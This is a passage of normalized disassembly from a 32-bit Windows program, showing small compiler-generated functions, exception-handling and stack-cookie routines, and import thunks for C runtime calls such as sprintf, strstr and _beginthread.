xor ecx ebp
call sub_4097f0
leave
retn 0x4
sub_40436d
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
leave
retn
sub_4046fd
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call _mbschr
pop ecx
pop ecx
pop ebp
retn
sub_4049b9
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
leave
retn
sub_404a15
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call _localtime64
pop ecx
pop ebp
retn
sub_404bc3
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x41c ]
leave
retn
sub_405047
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al 0x1
leave
retn 0x4
sub_405488
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al 0x1
leave
retn
sub_405493
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
xor eax eax
leave
retn
sub_40549e
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
xor eax eax
leave
retn 0x4
sub_4054ab
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al 0x1
leave
retn 0x8
sub_405a0c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
call sub_4034f0
mov ecx [ ebp - 0x4 ]
call sub_4034f0
leave
retn
sub_40675a
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub_406d54
retn
sub_406de1
push ebp
mov ebp esp
pop ebp
retn
sub_407d6c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
leave
retn 0x8
sub_407d88
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn 0x8
sub_4089b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al 0x1
leave
retn 0xc
sub_40976f
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x40c ] ecx
leave
retn 0x8
??2@YAPAXI@Z
jmp [ operator new@IAT ]
sprintf
jmp [ sprintf@IAT ]
atoi
jmp [ atoi@IAT ]
strstr
jmp [ strstr@IAT ]
printf
jmp [ printf@IAT ]
malloc
jmp [ malloc@IAT ]
memset
jmp [ memset@IAT ]
asctime_s
jmp [ asctime_s@IAT ]
_localtime64_s
jmp [ _localtime64_s@IAT ]
memcpy
jmp [ memcpy@IAT ]
_time64
jmp [ _time64@IAT ]
_beginthread
jmp [ _beginthread@IAT ]
atof
jmp [ atof@IAT ]
sscanf
jmp [ sscanf@IAT ]
sub_4097f0
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_409cab
retn
sub_409830
cmp [ rw-data ] 0x0
je sub_409866
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
rand
jmp [ rand@IAT ]
srand
jmp [ srand@IAT ]
_mbschr
jmp [ _mbschr@IAT ]
_localtime64
jmp [ _localtime64@IAT ]
_splitpath
jmp [ _splitpath@IAT ]
free
jmp [ free@IAT ]
realloc
jmp [ realloc@IAT ]
strncmp
jmp [ strncmp@IAT ]
__CxxFrameHandler3
jmp [ __CxxFrameHandler3@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
atol
jmp [ atol@IAT ]
strncpy
jmp [ strncpy@IAT ]
sub_409b5b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call _XcptFilter
pop ecx
pop ecx
retn
sub_409ba7
xor eax eax
inc eax
retn
_start
call sub_40a283
jmp sub_4099e1
sub_409db1
push 0xc
push r--data
call sub_40a1fc
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_40a241
retn
sub_409dce
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_409e63
call sub_409e01
mov [ rw-data ] eax
xor eax eax
retn
sub_409f19
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409e70
_except_handler4_common
jmp [ _except_handler4_common@IAT ]
sub_409f7a
push sub_409f38
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
_amsg_exit
jmp [ _amsg_exit@IAT ]
sub_40a02a
push 0x8
call _unlock
pop ecx
retn
sub_40a033
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_409f8e
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
_XcptFilter
jmp [ _XcptFilter@IAT ]
sub_40a1bb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
sub_40a241
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40a280
xor eax eax
retn
_crt_debugger_hook
jmp [ _crt_debugger_hook@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
?_type_info_dtor_internal_method@type_info@@QAEXXZ
jmp [ type_info::_type_info_dtor_internal_method@IAT ]
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
_invoke_watson
jmp [ _invoke_watson@IAT ]
_controlfp_s
jmp [ _controlfp_s@IAT ]
sub_40a34a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_4097f0
mov eax r--data
jmp __CxxFrameHandler3
sub_40a365
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_4097f0
mov eax r--data
jmp __CxxFrameHandler3
sub_40a380
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_4097f0
mov eax r--data
jmp __CxxFrameHandler3
